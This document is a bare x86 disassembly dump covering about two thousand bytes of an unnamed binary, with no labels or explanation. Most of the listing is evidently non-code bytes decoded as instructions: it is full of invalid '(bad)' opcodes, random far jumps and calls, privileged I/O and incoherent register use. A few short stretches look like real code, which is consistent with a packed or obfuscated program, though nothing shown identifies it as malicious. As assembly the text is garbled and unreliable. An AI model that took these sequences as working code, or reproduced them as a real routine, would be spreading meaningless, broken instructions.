  405177:	add    eax,0x828ace6e
  40517c:	push   esi
  40517d:	adc    al,0x8e
  40517f:	enter  0xf26c,0x1f
  405183:	call   0x5dd334fa
  405188:	test   DWORD PTR [esi-0x64],esp
  40518b:	pop    ecx
  40518c:	jno    0x4051c5
  40518e:	push   ebp
  40518f:	mov    al,0xba
  405191:	mov    dh,0xb9
  405193:	xor    BYTE PTR [eax-0x2d30bd8a],bl
  405199:	xlat   BYTE PTR ds:[ebx]
  40519a:	push   esi
  40519b:	mov    bl,BYTE PTR [ecx+0x43]
  40519e:	fimul  WORD PTR [edi-0x563df643]
  4051a4:	cld    
  4051a5:	cmp    BYTE PTR [ecx-0x1f],ah
  4051a8:	aas    
  4051a9:	dec    ebx
  4051aa:	push   ds
  4051ab:	push   es
  4051ac:	ret    
  4051ad:	addr16 jae 0x4051fe
  4051b0:	fs int3 
  4051b2:	sub    ch,BYTE PTR [ebx]
  4051b4:	pop    ebp
  4051b5:	pop    edi
  4051b6:	ins    DWORD PTR es:[edi],dx
  4051b7:	inc    esp
  4051b8:	xchg   edx,eax
  4051b9:	loope  0x405237
  4051bb:	data16 jge 0x405174
  4051be:	repnz dec ebx
  4051c0:	neg    DWORD PTR [esi+0x33]
  4051c3:	xorps  xmm4,XMMWORD PTR [ebx+0x52]
  4051c7:	sub    DWORD PTR [ebp+0x72],ebp
  4051ca:	mov    ds:0x971cbaf1,eax
  4051cf:	imul   esi,ebp,0x98185fc2
  4051d5:	in     al,0x26
  4051d7:	dec    ecx
  4051d8:	shl    BYTE PTR [ebx-0x17656733],0xaf
  4051df:	jae    0x405245
  4051e1:	adc    eax,DWORD PTR [ebx]
  4051e3:	mov    dh,0x74
  4051e5:	jae    0x4051c2
  4051e7:	cmp    ah,BYTE PTR [ecx-0x6940e5f]
  4051ed:	inc    eax
  4051ee:	dec    ebx
  4051ef:	mov    edi,0x44e01e8d
  4051f4:	repz jnp 0x40519d
  4051f7:	cmp    DWORD PTR [esi],esp
  4051f9:	jp     0x405271
  4051fb:	rcl    DWORD PTR [edx+0x75c4448a],0x7f
  405202:	rcr    DWORD PTR [esi-0x22],1
  405205:	aam    0x8
  405207:	loopne 0x40520d
  405209:	xlat   BYTE PTR ds:[ebx]
  40520a:	aaa    
  40520b:	xchg   edi,eax
  40520c:	cmp    bl,BYTE PTR [ebp+0x7]
  40520f:	lahf   
  405210:	inc    ecx
  405211:	adc    BYTE PTR [esi],dl
  405213:	rol    BYTE PTR gs:[eax+eiz*1-0x21ab8d18],cl
  40521b:	and    al,0x66
  40521d:	mov    ah,al
  40521f:	cmp    dh,bl
  405221:	inc    ebx
  405222:	stc    
  405223:	test   eax,0x7b125cb0
  405228:	repnz fiadd WORD PTR [ecx+0xf]
  40522c:	mov    BYTE PTR [esi],0x47
  40522f:	mov    ecx,0x65e4d62c
  405234:	jl     0x405299
  405236:	cmp    BYTE PTR [ebx],dl
  405238:	mov    al,0xb6
  40523a:	mov    BYTE PTR [eax+0x1c6b7f9c],al
  405240:	push   es
  405241:	mov    BYTE PTR [ebp+0x1c],0xa
  405245:	ds fs push es
  405248:	jns    0x40526e
  40524a:	jno    0x4051f3
  40524c:	pop    esp
  40524d:	nop
  40524e:	retfw  
  405250:	std    
  405251:	xchg   dh,dh
  405253:	sbb    esi,eax
  405255:	sub    BYTE PTR [edx],0x36
  405258:	mov    ebx,0xf3e054fe
  40525d:	dec    eax
  40525e:	jo     0x405294
  405260:	rep stos BYTE PTR es:[edi],al
  405262:	(bad)  
  405263:	push   es
  405264:	push   ds
  405265:	fmul   DWORD PTR [ebx]
  405267:	mov    edx,0xc4d36f81
  40526c:	adc    eax,0x1c900231
  405271:	inc    esp
  405272:	dec    esi
  405273:	mul    edx
  405275:	or     al,0x48
  405277:	sbb    bl,bh
  405279:	and    BYTE PTR [esi],ch
  40527b:	and    ch,dl
  40527d:	adc    eax,0x1e310e7c
  405282:	jo     0x4052fd
  405284:	jle    0x40521d
  405286:	dec    edi
  405287:	pop    edi
  405288:	add    al,0xc6
  40528a:	add    eax,0xad5dc5ed
  40528f:	sub    DWORD PTR [ebx+0x412c09c5],eax
  405295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405296:	sbb    DWORD PTR [esi+ebx*8+0x58cf55a5],esp
  40529d:	push   eax
  40529e:	add    esp,DWORD PTR [ecx+0x7ffc2897]
  4052a4:	jmp    0x8db2:0x7cfa7d6e
  4052ab:	mov    ds:0x436ccbdb,eax
  4052b0:	mov    bh,0xe7
  4052b2:	mov    dh,0xd
  4052b4:	mov    edx,0xb0bc7802
  4052b9:	std    
  4052ba:	jno    0x405248
  4052bc:	push   cs
  4052bd:	loope  0x4052ee
  4052bf:	jecxz  0x4052d7
  4052c1:	loop   0x405269
  4052c3:	shl    BYTE PTR [edi-0x31c30c03],0xcd
  4052ca:	jecxz  0x405291
  4052cc:	inc    edx
  4052cd:	push   eax
  4052ce:	jb     0x405332
  4052d0:	addr16 call 0x56c3:0x6db5858a
  4052d8:	and    eax,0xf9a2fa09
  4052dd:	xchg   esi,eax
  4052de:	push   ecx
  4052df:	idiv   DWORD PTR [ebx]
  4052e1:	das    
  4052e2:	jle    0x405315
  4052e4:	rol    BYTE PTR [ebx],1
  4052e6:	dec    ebx
  4052e7:	clc    
  4052e8:	js     0x40527c
  4052ea:	lods   al,BYTE PTR ds:[esi]
  4052eb:	or     bh,ch
  4052ed:	lock cmp al,0x1d
  4052f0:	aad    0x46
  4052f2:	sbb    al,0x61
  4052f4:	adc    eax,0x4e96d709
  4052f9:	fisttp QWORD PTR [esi+0x4e14aff0]
  4052ff:	int3   
  405300:	nop
  405301:	and    eax,0x2fa8b5ea
  405306:	fimul  DWORD PTR [ebp+eiz*8+0x743be7cd]
  40530d:	inc    esi
  40530e:	mov    cl,0xf8
  405310:	pusha  
  405311:	loope  0x405318
  405313:	aaa    
  405314:	mov    ah,0x82
  405316:	inc    eax
  405317:	jo     0x40535a
  405319:	shl    BYTE PTR [ecx-0x276243fe],0x7c
  405320:	ins    DWORD PTR es:[edi],dx
  405321:	lods   al,BYTE PTR ds:[esi]
  405322:	pop    ecx
  405323:	adc    BYTE PTR [ecx+0x460b2224],al
  405329:	test   eax,0x90e9ff80
  40532e:	test   BYTE PTR [edx+0x32],bh
  405331:	dec    esp
  405332:	cs sub al,0x27
  405335:	ret    0x7679
  405338:	xchg   esp,eax
  405339:	push   ds
  40533a:	xchg   edx,eax
  40533b:	jno    0x405329
  40533d:	scas   al,BYTE PTR es:[edi]
  40533e:	sahf   
  40533f:	mov    edi,0x86368640
  405344:	and    eax,0x1a22109
  405349:	mov    dh,0xe6
  40534b:	mov    ch,0x1b
  40534d:	xlat   BYTE PTR ds:[ebx]
  40534e:	and    eax,0x9de73968
  405353:	scas   eax,DWORD PTR es:[edi]
  405354:	adc    ah,BYTE PTR [esi-0xe]
  405357:	int3   
  405358:	mov    al,0xa
  40535a:	fidivr DWORD PTR [ebp-0xd09dd0e]
  405360:	jmp    0x40531c
  405362:	jl     0x40533f
  405364:	push   ebx
  405365:	xor    ch,ah
  405367:	repnz out dx,eax
  405369:	mov    ebx,ebx
  40536b:	jge    0x4053b4
  40536d:	mov    cl,BYTE PTR [ecx+esi*8-0x3458d4b7]
  405374:	pop    edx
  405375:	fbstp  TBYTE PTR [ebp+0x5a]
  405378:	not    BYTE PTR [esi+0x774eb0b4]
  40537e:	loope  0x40538f
  405380:	add    bh,0x28
  405383:	das    
  405384:	call   0xc65c:0x5930d190
  40538b:	xchg   edi,eax
  40538c:	jne    0x405376
  40538e:	(bad)  
  40538f:	dec    edi
  405390:	sub    al,0x4e
  405392:	sub    BYTE PTR [ebp+eax*1+0x65],bh
  405396:	push   edi
  405397:	push   eax
  405398:	fstp   DWORD PTR ds:0x807f86ea
  40539e:	arpl   WORD PTR [eax+0x63],dx
  4053a1:	mov    dl,0x9
  4053a4:	xor    ch,bl
  4053a6:	std    
  4053a7:	mov    al,0x73
  4053a9:	in     al,dx
  4053aa:	push   es
  4053ab:	mov    bh,0x70
  4053ad:	jl     0x405397
  4053af:	out    dx,al
  4053b0:	imul   esi,DWORD PTR [edi-0x73],0xffffffe7
  4053b4:	in     al,0xbe
  4053b6:	adc    esi,DWORD PTR [ebp-0x3c]
  4053b9:	adc    al,0xb1
  4053bb:	ss pop edx
  4053bd:	cmp    al,0x27
  4053bf:	ret    
  4053c0:	push   edi
  4053c1:	mov    al,ds:0x2800a25f
  4053c6:	(bad)  
  4053c7:	in     al,0x97
  4053c9:	cmp    eax,0x61434117
  4053ce:	pop    edi
  4053cf:	ror    ebp,1
  4053d1:	test   BYTE PTR ds:0xe85fb36c,bh
  4053d7:	sub    eax,DWORD PTR [ebx+eiz*8-0x67]
  4053db:	rcl    BYTE PTR [esi+0x43848a9d],1
  4053e1:	push   edi
  4053e2:	rcl    DWORD PTR [ebp-0x5b],cl
  4053e5:	xor    ah,al
  4053e7:	cmp    eax,0xd8d034f5
  4053ec:	cmp    dl,cl
  4053ee:	xchg   edx,eax
  4053ef:	mov    ebp,0x90defa85
  4053f4:	out    dx,eax
  4053f5:	ret    
  4053f6:	std    
  4053f7:	js     0x4053a1
  4053f9:	js     0x405420
  4053fb:	adc    al,0x38
  4053fd:	push   eax
  4053fe:	push   ss
  4053ff:	inc    edx
  405400:	fidiv  DWORD PTR [ebx+edi*2+0x5b]
  405404:	push   ebp
  405405:	in     al,dx
  405406:	ins    DWORD PTR es:[edi],dx
  405407:	clc    
  405408:	outs   dx,DWORD PTR ds:[esi]
  405409:	or     eax,0x2b276ffa
  40540e:	out    dx,eax
  40540f:	push   ecx
  405410:	std    
  405411:	rol    DWORD PTR [eax+esi*2-0x56ed5b08],0x28
  405419:	outs   dx,BYTE PTR ds:[esi]
  40541a:	add    al,0x13
  40541c:	cdq    
  40541d:	fnstenv [edx+0x64]
  405420:	lahf   
  405421:	adc    dh,BYTE PTR [edi-0x79]
  405424:	or     dh,ch
  405426:	data16 xlat BYTE PTR ds:[ebx]
  405428:	sub    esp,DWORD PTR [edx+esi*4-0x6d]
  40542c:	test   cl,bh
  40542e:	sub    al,0x13
  405430:	xor    BYTE PTR [eax-0x2741f358],dl
  405436:	sbb    BYTE PTR [eax],0x90
  405439:	pop    edx
  40543a:	push   ebx
  40543b:	mov    dh,BYTE PTR [eax+0x7503000c]
  405441:	ins    WORD PTR es:[edi],dx
  405443:	sar    DWORD PTR ds:0xce12452d,1
  405449:	sub    al,ch
  40544b:	push   ecx
  40544c:	sub    ch,0x67
  40544f:	fisub  DWORD PTR [eax]
  405451:	push   cs
  405452:	outs   dx,DWORD PTR ds:[esi]
  405453:	xor    al,0xea
  405455:	jl     0x405437
  405457:	cmp    ecx,ecx
  405459:	inc    esp
  40545a:	pop    edi
  40545b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40545c:	pushf  
  40545d:	(bad)  
  40545e:	push   eax
  40545f:	jne    0x405496
  405461:	outs   dx,BYTE PTR ds:[esi]
  405462:	sub    eax,0x17f45642
  405467:	dec    edx
  405468:	fstp   QWORD PTR [edx]
  40546a:	cmc    
  40546b:	outs   dx,DWORD PTR ds:[esi]
  40546c:	aam    0x97
  40546e:	adc    al,0x4f
  405470:	adc    dh,BYTE PTR ds:0xe9ffd24b
  405476:	jmp    0x88ba:0x5017d548
  40547d:	mov    ebx,esi
  40547f:	xor    eax,0xcc2c95e
  405484:	add    BYTE PTR [ebp-0x75],dl
  405487:	in     al,dx
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	lahf   
  4054a9:	loopne 0x40546e
  4054ab:	rcl    BYTE PTR [eax],1
  4054ad:	aaa    
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x40545b
  4054b5:	repz out 0x48,al
  4054b8:	pop    eax
  4054b9:	fst    DWORD PTR [ebx]
  4054bb:	push   ecx
  4054bc:	jae    0x4054ae
  4054be:	rol    DWORD PTR [ecx+0x2d],0xf1
  4054c2:	lahf   
  4054c3:	sub    DWORD PTR [esi+0x13],ebp
  4054c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054c7:	fnsave [ebx+0xd]
  4054ca:	sub    BYTE PTR [esi+0x2c],0x2e
  4054ce:	rcl    BYTE PTR [eax-0x13],cl
  4054d1:	std    
  4054d2:	fwait
  4054d3:	popa   
  4054d4:	shr    DWORD PTR [edx+ebp*1-0x9],1
  4054d8:	sub    DWORD PTR [edx+ebx*4-0x7],esp
  4054dc:	fld    DWORD PTR [eax-0x21d3d453]
  4054e2:	adc    DWORD PTR [edi+esi*1-0x19],edi
  4054e6:	pop    esp
  4054e7:	push   cs
  4054e8:	fdivr  DWORD PTR [edx-0x5]
  4054eb:	dec    esi
  4054ec:	or     al,0xec
  4054ee:	popf   
  4054ef:	adc    cl,BYTE PTR [esi+0x2a1a0786]
  4054f5:	adc    DWORD PTR [ebp+0x798961e7],edx
  4054fb:	adc    DWORD PTR [edi],ecx
  4054fd:	mov    bl,BYTE PTR [edx]
  4054ff:	loop   0x4054ee
  405501:	xor    eax,0xa9487f00
  405506:	loope  0x40553c
  405508:	mov    edi,0x1dc667c4
  40550d:	js     0x405553
  40550f:	in     eax,dx
  405510:	push   esi
  405511:	pop    ebp
  405512:	mov    ebx,0x4c283e14
  405517:	mov    ch,0x6a
  405519:	icebp  
  40551a:	stc    
  40551b:	test   BYTE PTR [ebx-0x332f961b],cl
  405521:	lods   al,BYTE PTR ds:[esi]
  405522:	bswap  edi
  405524:	(bad)  
  405526:	cmp    DWORD PTR es:[edi-0x654a8f5c],esp
  40552d:	mov    esi,0x82ba5e6e
  405532:	imul   esi,edi,0x6818f72
  405538:	pop    edx
  405539:	pop    ss
  40553a:	scas   al,BYTE PTR es:[edi]
  40553b:	sbb    eax,0x2003967d
  405540:	div    bl
  405542:	inc    ecx
  405543:	call   FWORD PTR cs:0xf7fde30b
  40554a:	call   0x35c5:0xed19c43a
  405551:	test   eax,0xeb5ce6a7
  405556:	jbe    0x4055a1
  405558:	cmp    eax,0x9c343c0f
  40555d:	loope  0x4055cf
  40555f:	xchg   ax,ax
  405561:	test   ecx,eax
  405563:	scas   al,BYTE PTR es:[edi]
  405564:	mov    edx,0x5b5fa252
  405569:	push   eax
  40556a:	xchg   ebx,eax
  40556b:	dec    esp
  40556c:	cmp    DWORD PTR [edx+edi*1-0x4d],ecx
  405570:	pop    esp
  405571:	lds    esp,FWORD PTR [eax]
  405573:	sub    eax,0xd3fbadd6
  405578:	push   edi
  405579:	jg     0x40552e
  40557b:	inc    ecx
  40557c:	sub    DWORD PTR [edi+0x778414c2],0x6f
  405583:	jmp    0x6230:0xaeca1a3a
  40558a:	(bad)  
  40558b:	mov    eax,ds:0xb56edfc3
  405590:	and    BYTE PTR [edi+edx*8],ah
  405593:	push   ds
  405594:	popa   
  405595:	popa   
  405596:	(bad)  
  405597:	icebp  
  405598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405599:	inc    edx
  40559a:	cs call 0xf8ab:0xd278a03e
  4055a2:	ret    0x706b
  4055a5:	icebp  
  4055a6:	mov    ebx,0x46361409
  4055ab:	dec    edx
  4055ac:	sbb    esi,DWORD PTR [ebx-0x6a]
  4055af:	mov    ah,0xab
  4055b1:	mov    esi,0x8b6f3d46
  4055b6:	shl    DWORD PTR [esi],0x17
  4055b9:	mov    ds:0x363dd722,al
  4055be:	es popf 
  4055c0:	cld    
  4055c1:	and    DWORD PTR [ebp-0x6f3cc8c6],0xfffffff0
  4055c8:	mov    ds:0xd5cb0311,eax
  4055cd:	fwait
  4055ce:	mov    eax,ds:0x1b09ccdf
  4055d3:	out    0x75,al
  4055d5:	fadd   st(6),st
  4055d7:	mov    ecx,0xe784b4a9
  4055dc:	jg     0x4055a2
  4055de:	(bad)  
  4055e0:	xor    esi,ebp
  4055e2:	sbb    BYTE PTR [edx+0x6b],0x4b
  4055e6:	je     0x405645
  4055e8:	lea    ecx,ds:0xc8d6397e
  4055ee:	xchg   edx,eax
  4055ef:	fcomp  st(4)
  4055f1:	in     al,dx
  4055f2:	dec    ebp
  4055f3:	pop    ecx
  4055f4:	cmp    al,BYTE PTR [ebx-0x6b]
  4055f7:	pop    eax
  4055f8:	or     eax,0x849875ce
  4055fd:	aad    0xc5
  4055ff:	add    esp,DWORD PTR [ecx*4-0x6ba7d4eb]
  405606:	pop    es
  405607:	outs   dx,BYTE PTR ds:[esi]
  405608:	xchg   ecx,eax
  405609:	(bad)  
  40560a:	jnp    0x405624
  40560c:	loope  0x405630
  40560e:	lds    ecx,FWORD PTR [edx]
  405610:	je     0x405633
  405612:	lea    ecx,[esi+0x3d]
  405615:	daa    
  405616:	cmc    
  405617:	mov    eax,ds:0x650ef46d
  40561c:	sar    bl,1
  40561e:	mov    eax,0xbd122934
  405623:	push   edi
  405624:	hlt    
  405625:	mov    ch,0x9f
  405627:	aam    0xf
  405629:	and    edx,DWORD PTR [ecx]
  40562b:	and    BYTE PTR ds:0x10e06523,0x86
  405632:	cmp    cl,dl
  405634:	call   0x7f44bf1f
  405639:	pop    ebp
  40563a:	(bad)  
  40563b:	pop    edi
  40563c:	inc    ebx
  40563d:	inc    eax
  40563e:	in     al,dx
  40563f:	stos   BYTE PTR es:[edi],al
  405640:	(bad)  
  405641:	in     al,dx
  405642:	daa    
  405643:	jmp    0xeaff:0xa67e9eb5
  40564a:	out    0x1a,eax
  40564c:	repnz mov dl,0x66
  40564f:	add    BYTE PTR [esi-0x5],dh
  405652:	lahf   
  405653:	sub    ebx,DWORD PTR [edx-0x4a]
  405656:	pop    ds
  405657:	cld    
  405658:	test   DWORD PTR [ebx],0x27fb8055
  40565e:	mov    bl,0xee
  405660:	push   es
  405661:	cmp    DWORD PTR [ebp+ebx*8+0x7012ca03],ebx
  405668:	lods   eax,DWORD PTR ds:[esi]
  405669:	dec    eax
  40566a:	shr    BYTE PTR [edi],1
  40566c:	lea    edi,[esi+0x60f13c43]
  405672:	jmp    0x9426:0x2dc726f5
  405679:	push   eax
  40567a:	shl    DWORD PTR ds:0x9c93fb4,cl
  405680:	mov    ebx,0x877b44b8
  405685:	lods   al,BYTE PTR ds:[esi]
  405686:	leave  
  405687:	data16 (bad) 
  405689:	stos   BYTE PTR es:[edi],al
  40568a:	inc    ecx
  40568b:	mov    dl,0x81
  40568d:	aam    0x1a
  40568f:	ins    BYTE PTR es:[edi],dx
  405690:	sub    eax,0xcae97d3d
  405695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405696:	lea    esi,[ebp-0x1b]
  405699:	mov    al,0xa2
  40569b:	pop    edx
  40569c:	fimul  DWORD PTR ds:0x375bca95
  4056a2:	(bad)
  4056a6:	or     ah,BYTE PTR [edi-0x50]
  4056a9:	out    0x54,eax
  4056ab:	(bad)  
  4056ac:	xlat   BYTE PTR ds:[ebx]
  4056ad:	sub    eax,0xea909b0f
  4056b2:	pop    ecx
  4056b3:	jbe    0x4056a4
  4056b5:	hlt    
  4056b6:	je     0x40564b
  4056b8:	lods   eax,DWORD PTR ds:[esi]
  4056b9:	xchg   ecx,eax
  4056ba:	jnp    0x40564e
  4056bc:	pop    edi
  4056be:	mov    edi,0x681c3bd1
  4056c3:	outs   dx,BYTE PTR ds:[esi]
  4056c4:	sbb    ebx,ecx
  4056c6:	mov    bh,0xd0
  4056c8:	imul   DWORD PTR ds:0x11232322
  4056ce:	fdivr  QWORD PTR [esi-0x4f8d842f]
  4056d4:	js     0x4056ce
  4056d6:	(bad)
  4056d9:	push   eax
  4056da:	ins    BYTE PTR es:[edi],dx
  4056db:	sbb    al,0x45
  4056dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056de:	pop    eax
  4056df:	in     eax,0x45
  4056e1:	mov    eax,0xfc5d6d21
  4056e6:	ja     0x40573f
  4056e8:	daa    
  4056e9:	mov    ds:0xb09632d8,al
  4056ee:	test   DWORD PTR [ebx],edx
  4056f0:	push   cs
  4056f1:	xor    ebx,DWORD PTR [ecx]
  4056f3:	adc    al,0x2
  4056f5:	out    dx,al
  4056f6:	sub    edx,DWORD PTR [edx-0x3d]
  4056f9:	push   edi
  4056fa:	mov    ebp,0xce5fb3f6
  4056ff:	(bad)  
  405700:	xchg   ebx,eax
  405701:	xchg   BYTE PTR [edx-0x3ab6e02e],dl
  405707:	stos   DWORD PTR es:[edi],eax
  405708:	in     al,0xe1
  40570a:	in     eax,dx
  40570b:	jb     0x4056e5
  40570d:	clc    
  40570e:	xor    ebp,0x658b51ba
  405714:	push   es
  405715:	ret    
  405716:	cmp    eax,0x7daffed0
  40571b:	(bad)  
  40571c:	ds ds cli 
  40571f:	xchg   esp,eax
  405720:	aas    
  405721:	frstor [esi-0x16]
  405724:	dec    ebp
  405725:	stos   DWORD PTR es:[edi],eax
  405726:	push   es
  405727:	mov    eax,0x5348d923
  40572c:	cmp    eax,0xdb543aa7
  405731:	add    BYTE PTR [edi+edx*4+0x335cdb88],0x70
  405739:	icebp  
  40573a:	or     dl,BYTE PTR fs:[ebp+0x3b1b3b4b]
  405741:	jp     0x405726
  405743:	jg     0x4056d2
  405745:	inc    edx
  405746:	aas    
  405747:	xadd   DWORD PTR [esp+eax*8+0x25d156db],edi
  40574f:	dec    edx
  405750:	dec    ebp
  405751:	nop
  405752:	xor    DWORD PTR [edi+0xb],esp
  405755:	ror    DWORD PTR [esi-0x78],1
  405758:	xchg   DWORD PTR [esi-0x11f8993d],edx
  40575e:	mov    ch,0x0
  405760:	add    al,0x50
  405762:	outs   dx,DWORD PTR ds:[esi]
  405763:	ror    BYTE PTR [edi+edx*1+0xe34ebcd],cl
  40576a:	push   ecx
  40576b:	movzx  eax,WORD PTR ds:0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x7dd46e42],eax
  405790:	push   ebx
  405791:	arpl   WORD PTR [edx+0x35],cx
  405794:	jo     0x405806
  405796:	stos   BYTE PTR es:[edi],al
  405797:	jle    0x405809
  405799:	jo     0x405743
  40579b:	mov    edi,0xfd6601b7
  4057a0:	cmp    BYTE PTR [edx],0xba
  4057a3:	cld    
  4057a4:	add    BYTE PTR [edi],0x92
  4057a7:	or     DWORD PTR [edi-0x75a357d7],0x62
  4057ae:	fistp  DWORD PTR [eax-0x78dad646]
  4057b4:	pop    esi
  4057b5:	jmp    0x2be39bc1
  4057ba:	dec    ebx
  4057bb:	adc    ebx,0x7b5c8c72
  4057c1:	mov    ecx,0xac22b6b0
  4057c6:	es pop es
  4057c8:	repnz es mov ecx,0xadf360aa
  4057cf:	sub    al,0x65
  4057d1:	(bad)  
  4057d3:	jmp    0x12e7a50c
  4057d8:	or     eax,DWORD PTR [ebx-0x54]
  4057db:	div    DWORD PTR [esp+ecx*8+0x32e0ffb4]
  4057e2:	xchg   edi,eax
  4057e3:	scas   eax,DWORD PTR es:[edi]
  4057e4:	dec    edx
  4057e5:	rol    DWORD PTR [edi-0x43],1
  4057e8:	dec    edi
  4057e9:	out    dx,eax
  4057ea:	dec    edi
  4057eb:	data16 mov cl,0x5e
  4057ee:	add    DWORD PTR [edi+edi*8+0x17],0xffffffad
  4057f3:	sbb    al,0x45
  4057f5:	inc    ebx
  4057f6:	jno    0x4057ef
  4057f8:	push   edi
  4057f9:	(bad)  
  4057fa:	test   al,0x5e
  4057fc:	push   ss
  4057fd:	add    cl,cl
  4057ff:	pop    edi
  405800:	(bad)  
  405801:	das    
  405802:	and    eax,0x471e484e
  405807:	aam    0x20
  405809:	adc    al,0x7a
  40580b:	or     eax,0xee51888b
  405810:	and    ch,BYTE PTR [esp+ebp*8+0x4054e5e9]
  405817:	gs ins BYTE PTR es:[edi],dx
  405819:	iret   
  40581a:	mov    ecx,0x569a865d
  40581f:	and    eax,0x62adb4a8
  405824:	inc    esp
  405825:	out    dx,al
  405826:	fist   WORD PTR [eax]
  405828:	and    eax,0x2b5fe9a6
  40582d:	inc    eax
  40582e:	inc    edi
  40582f:	push   esp
  405830:	mov    bh,0x7c
  405832:	int3   
  405833:	shl    esp,1
  405835:	test   BYTE PTR [edx+ecx*8+0x50c325fa],al
  40583c:	and    eax,DWORD PTR [edi+0x2bf8a4e7]
  405842:	mov    ch,0x18
  405844:	push   esp
  405845:	and    BYTE PTR [ecx+0x1a],bh
  405848:	pusha  
  405849:	scas   al,BYTE PTR es:[edi]
  40584a:	jae    0x40588c
  40584c:	xchg   edi,eax
  40584d:	out    0xa6,eax
  40584f:	test   DWORD PTR [eax+edi*4-0x4377f8e6],0xc0d0c5e6
  40585a:	mov    eax,ds:0x18447cfc
  40585f:	sbb    DWORD PTR [ebx],eax
  405861:	iret   
  405862:	or     cl,al
  405864:	and    eax,0x72193852
  405869:	push   ebx
  40586a:	gs push cs
  40586c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40586d:	mov    esi,0x3a04e58c
  405872:	add    esp,ecx
  405874:	sbb    esi,DWORD PTR fs:[ecx+eiz*1-0x430cda46]
  40587c:	retw   
  40587e:	mov    bh,0x9b
  405880:	xchg   esp,eax
  405881:	clc    
  405882:	lds    edi,FWORD PTR [edi+edx*8]
  405885:	and    al,0xe
  405887:	cmp    bh,ah
  405889:	popa   
  40588a:	pop    esi
  40588b:	aad    0xc2
  40588d:	popfw  
  40588f:	fstp   st(4)
  405891:	in     al,dx
  405892:	rcl    DWORD PTR [ebx+0x61],0xb5
  405896:	inc    edi
  405897:	xlat   BYTE PTR ds:[ebx]
  405898:	cmp    dh,bl
  40589a:	xchg   esi,eax
  40589b:	sub    DWORD PTR [ebx-0x57],ecx
  40589e:	jo     0x4058a4
  4058a0:	cmc    
  4058a1:	adc    al,0x56
  4058a3:	test   BYTE PTR [ecx+0x1f],bh
  4058a6:	xchg   ebx,eax
  4058a7:	dec    ecx
  4058a8:	daa    
  4058a9:	scas   eax,DWORD PTR es:[edi]
  4058aa:	fld    TBYTE PTR [ebx]
  4058ac:	mov    esp,0xbe75f7ea
  4058b1:	sub    BYTE PTR [eax+0x1f],ch
  4058b4:	loope  0x40583e
  4058b6:	in     eax,dx
  4058b7:	ret    
  4058b8:	ret    
  4058b9:	dec    ebp
  4058ba:	rcl    DWORD PTR [eax],1
  4058bc:	mov    ecx,0x1b895fa2
  4058c1:	stos   BYTE PTR es:[edi],al
  4058c2:	add    BYTE PTR [ecx-0x53],ah
  4058c5:	jmp    0xcfcaa6f0
  4058ca:	inc    esi
  4058cb:	ret    0xe1d2
  4058ce:	in     eax,dx
  4058cf:	xor    al,dh
  4058d1:	or     BYTE PTR [edi+0x4697d8e7],bh
  4058d7:	jl     0x4058ed
  4058d9:	mov    ss,edi
  4058db:	bound  edx,QWORD PTR [esi+ecx*2+0x1b890207]
  4058e2:	outs   dx,DWORD PTR ds:[esi]
  4058e3:	shl    DWORD PTR fs:[ebx-0x22113b8c],1
  4058ea:	std    
  4058eb:	xor    ax,0xeef4
  4058ef:	mov    cr6,eax
  4058f2:	inc    ebx
  4058f3:	sub    bh,BYTE PTR [ecx]
  4058f5:	nop
  4058f6:	out    0x4e,al
  4058f8:	int    0x53
  4058fa:	int    0x15
  4058fc:	mov    bh,0x87
  4058fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058ff:	and    DWORD PTR [eax-0x8c15cde],0xa59e1427
  405909:	inc    DWORD PTR [edx+ebx*1-0x75]
  40590d:	lahf   
  40590e:	bswap  ebp
  405910:	enter  0xff88,0x21
  405914:	imul   esp,edx,0xd73e588f
  40591a:	push   edi
  40591b:	add    DWORD PTR ds:0xf32e9e81,edi
  405921:	sbb    al,0x9b
  405923:	aaa    
  405924:	inc    ebx
  405925:	lds    edi,FWORD PTR [eax+edx*1]
  405928:	imul   eax,DWORD PTR [esi+0x3],0xffffffb1
  40592c:	pop    eax
  40592d:	(bad)  
  40592e:	cli    
  40592f:	cld    
  405930:	mov    ebp,0x1413294f
  405935:	inc    ecx
  405936:	jae    0x405932
  405938:	xchg   esp,eax
  405939:	push   ecx
  40593a:	push   ebx
  40593b:	cmp    al,0x4d
  40593d:	xor    cl,BYTE PTR ds:0x1988a843
  405943:	mov    eax,0x49b16d1e
  405948:	jne    0x40599f
  40594a:	sti    
  40594b:	cmp    DWORD PTR [edx+eax*8+0x5282fd28],edi
  405952:	add    DWORD PTR ds:0x258dfd2d,0x14
  405959:	push   cs
  40595a:	add    edi,ebx
  40595c:	and    DWORD PTR [edx],esi
  40595e:	sbb    eax,DWORD PTR [edi-0x10]
  405961:	and    eax,0x7c
  405964:	jmp    0x7059cae
  405969:	sbb    eax,DWORD PTR [edx+0x613f1aaf]
  40596f:	or     esi,DWORD PTR [ebx+0x125c792b]
  405975:	sub    dh,0x29
  405978:	mov    eax,ds:0xcaf9a373
  40597d:	pop    ds
  40597e:	adc    edi,DWORD PTR ds:0xb51209bc
  405984:	aam    0x43
  405986:	push   ebp
  405987:	call   0xb9dcafb2
  40598c:	xchg   DWORD PTR [edi+edi*8-0x64f45ffc],esi
  405993:	fcmovnbe st,st(6)
  405995:	inc    eax
  405996:	inc    ebp
